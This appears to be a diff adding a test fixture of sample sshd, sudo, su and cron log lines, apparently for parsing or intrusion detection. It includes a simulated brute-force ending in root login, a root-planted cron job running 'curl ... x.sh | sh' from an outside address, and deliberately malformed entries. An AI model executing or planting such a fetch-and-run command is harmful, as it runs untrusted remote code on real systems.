@@ -1,0 +1,25 @@
+Oct 22 10:00:01 vps-a sshd[1001]: Failed password for root from 203.0.113.7 port 52100 ssh2
+Oct 22 10:00:03 vps-a sshd[1001]: Failed password for invalid user admin from 203.0.113.7 port 52102 ssh2
+Oct 22 10:00:05 vps-a sshd[1001]: message repeated 3 times: [ Failed password for root from 203.0.113.7 port 52104 ssh2]
+Oct 22 10:00:09 vps-a sshd[1002]: Accepted password for root from 203.0.113.7 port 52110 ssh2
+Oct 22 10:00:09 vps-a sshd[1002]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Oct 22 10:01:00 vps-a sshd[1003]: Accepted publickey for kris from 198.51.100.20 port 40022 ssh2: ED25519 SHA256:AbCdEf0123456789
+Oct 22 10:01:30 vps-a sshd[1004]: Invalid user oracle from 192.0.2.50 port 41000
+Oct 22 10:01:31 vps-a sshd[1004]: error: maximum authentication attempts exceeded for invalid user oracle from 192.0.2.50 port 41000 ssh2 [preauth]
+Oct 22 10:02:00 vps-a sshd[1005]: Failed password for invalid user x from 198.51.100.99 port 1 ssh2 from 192.0.2.66 port 43000 ssh2
+Oct 22 10:03:00 vps-a sudo:     kris : TTY=pts/0 ; PWD=/home/kris ; USER=root ; COMMAND=/bin/bash
+Oct 22 10:03:00 vps-a sudo: pam_unix(sudo:session): session opened for user root(uid=0) by kris(uid=1000)
+Oct 22 10:03:05 vps-a sudo: pam_unix(sudo:auth): authentication failure; logname=mallory uid=1001 euid=0 tty=/dev/pts/1 ruser=mallory rhost=  user=mallory
+Oct 22 10:03:10 vps-a sudo:  mallory : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/id
+Oct 22 10:03:20 vps-a sudo:  mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c id
+Oct 22 10:04:00 vps-a su[2001]: (to root) kris on pts/0
+Oct 22 10:04:05 vps-a su[2002]: FAILED SU (to root) mallory on pts/1
+Oct 22 10:05:00 vps-a crontab[3001]: (kris) BEGIN EDIT (kris)
+Oct 22 10:05:30 vps-a crontab[3001]: (kris) REPLACE (kris)
+Oct 22 10:05:40 vps-a crontab[3002]: (root) REPLACE (www-data)
+Oct 22 10:06:01 vps-a CRON[3100]: (www-data) CMD (curl -s http://198.51.100.9/x.sh | sh)
+2026-10-22T12:07:00.123456+02:00 vps-b sshd-session[4001]: Failed password for root from 2001:db8::5 port 22 ssh2
+Oct 22 10:08:00 vps-a sshd[1006]: Connection closed by authenticating user root 203.0.113.7 port 52120 [preauth]
+Dec 31 23:59:59 vps-a sshd[1]: Accepted password for root from 192.0.2.1 port 22 ssh2
+Feb 30 10:00:00 vps-a sshd[1]: Accepted password for root from 192.0.2.1 port 22 ssh2
+this is not syslog
